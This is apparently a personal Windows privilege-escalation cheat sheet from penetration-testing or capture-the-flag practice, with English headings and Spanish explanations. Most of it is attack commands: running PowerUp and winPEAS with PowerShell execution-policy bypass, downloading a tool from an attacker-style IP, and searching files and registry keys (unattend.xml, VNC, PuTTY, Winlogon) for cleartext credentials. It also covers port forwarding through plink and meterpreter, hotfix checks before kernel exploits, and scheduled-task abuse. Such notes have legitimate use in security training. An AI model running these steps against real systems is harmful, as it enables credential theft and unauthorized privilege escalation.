# Automatic tools
## From file
```
c:> powershell.exe -nop -exec bypass
PS C:> ./PowerUp.ps1
PS C:> Invoke-AllChecks
```
## From url
```
c:> powershell.exe -nop -exec bypass
PS c:> Import-MOdule ./PowerUp.ps1
PS c:> Invoke-AllChecks
```
# 2. Winpeas
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.14.6/winPEAS64.exe','C:\users\Administrator\Documents\wp.exe')"

c:\users\kosts\Desktop> .\wp.exe
```


# Manual info gathering
## Operating System
```
system info
wmic qfe
```
# Environment variables
```
set
Get-ChildItem Env: | ft Key,Value
```
# Drives
```
net use
wmic logicaldisk get caption, description, providername
wmic logicaldisk get name
wmic logicaldisk get caption
diskpart
list volume
```
```
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root

get-psdrive -psprovider filesystem
```
# Mount/map
```
net use \\IP address\IPC$ "" /u:""
net use \\192.168.1.101\IPC$ "" /u:""
```
# Users
## Whoami
```
whoami /priv
echo %USERNAME%
$env:UserName
```
# Clear text passwords
## Search for them 
```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```
## In Files
These are common files to find them in. They might be base64-encoded. So look out for that.
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```
## In registry
```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
## Service only avaible from inside
A veces, hay servicios a los que solo se puede acceder desde dentro de la red. Por ejemplo, es posible que no se pueda acceder a un servidor MySQL desde el exterior, por razones de seguridad. También es común tener diferentes aplicaciones de administración a las que solo se puede acceder desde dentro de la red/máquina. Como una interfaz de impresora, o algo así. Estos servicios pueden ser más vulnerables ya que no deben verse desde el exterior.
```
netstat -ano
```
Ejemplo de salida:
```
Proto  Local address      Remote address     State        User  Inode  PID/Program name
    -----  -------------      --------------     -----        ----  -----  ----------------
    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -
    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -
    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -
    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -
    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -
    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -
    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -
    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -
```
Busque LISTEN/LISTEN. Compare eso con el escaneo que hizo desde el exterior.
¿Contiene algún puerto que no sea accesible desde el exterior?

Si ese es el caso, tal vez puedas hacer un reenvío remoto para acceder a él. 
```
# Reenvío de puerto utilizando plink
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080

#Reenvío de puerto utilixando meterpreter
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
portfwd add -l 3306 -p 3306 -r 192.168.1.101
```
Entonces, ¿cómo de debería de interpretar la salida del netstat?

**Dirección local 0.0.0.0**

La dirección local 0.0.0.0 significa que el servicio está escuchando en todas las interfaces. Esto significa que puede recibir una conexión desde la tarjeta de red, desde la interfaz loopback o cualquier otra interfaz. Esto significa que cualquiera puede conectarse a él.

**Dirección local 127.0.0.1**

La dirección local 127.0.0.1 significa que el servicio solo está escuchando la conexión desde su PC. No de Internet ni de ningún otro lugar. ¡Esto es interesante para nosotros!

**Dirección local 192.168.1.9**

La dirección local 192.168.1.9 significa que el servicio solo escucha las conexiones de la red local. Entonces, alguien de la red local puede conectarse, pero no alguien de Internet. ¡Esto también es interesante para nosotros! 
# Kernel Explotation
Este tipo de vulnerabilidades tendria que ser nuestro último recurso a utilizar, ya que podía provocar que la máquina se encuentre en un estado inestable o crear algún problema con la máquina
## Indentify hotfixes/patches
```
systeminfo
#or
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
## Python to Binary
Si tenemos un exploit escrito en Python pero no tenemos Python instalado en la máquina víctima, siempre podemos transformarlo en un binario con pyinstaller. Buen truco para saber. 

## Scheduled Tasks
En este momento tenemos que buscar tareas que osn ejecutadas por un usuario elevado y que ejecuta un binario que podemos sobrescribir.
```
schtasks /query /fo LIST /v
```
Esto, en teoría produce una gran cantidad de texto. Pero puedes generar cadenas relevantes con ```findstr```.
